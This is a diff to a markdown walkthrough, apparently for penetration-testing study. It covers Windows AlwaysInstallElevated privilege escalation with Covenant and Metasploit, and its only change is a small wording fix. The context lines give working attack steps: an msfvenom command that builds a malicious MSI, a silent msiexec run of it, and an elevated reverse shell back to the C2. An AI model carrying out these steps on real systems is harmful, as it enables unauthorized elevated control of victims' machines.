@@ -45,7 +45,7 @@ We will use Covenant and Metasploit here.
 
 #### Exploitation
 
-- generate a payload with msfvenom `msfvenom -p windows/exec CMD="" -f msi -o exploitalwaysinstalled.msi` between the quotes put copy and paste an encoded launcher.
+- generate a payload with msfvenom `msfvenom -p windows/exec CMD="" -f msi -o exploitalwaysinstalled.msi` between the quotes copy and paste an encoded launcher.
 - Upload your file in the target using Upload command from covenant (type `Upload` and enter, file the file path for the target and browse to the file in your attack machine)
 - run it using `shell msiexec /quiet /qn /i exploitalwaysinstalled.msi
 - We should get a prompt for another reverse shell in our grunts as an elevated user
